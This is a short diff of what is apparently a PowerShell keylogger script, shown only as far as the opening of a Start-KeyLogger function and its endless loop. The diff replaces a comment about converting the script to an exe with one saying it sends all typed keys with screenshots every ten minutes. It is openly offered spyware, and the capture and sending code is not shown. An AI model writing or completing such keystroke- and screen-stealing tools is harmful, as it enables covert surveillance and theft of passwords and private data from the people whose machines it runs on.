@@ -1,6 +1,4 @@
-######################################################################
-## after you modify the information below then convert it to exe file#
-######################################################################
+# This script will send you all typed keys with printscreen every 10 minutes.
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
 while($true){
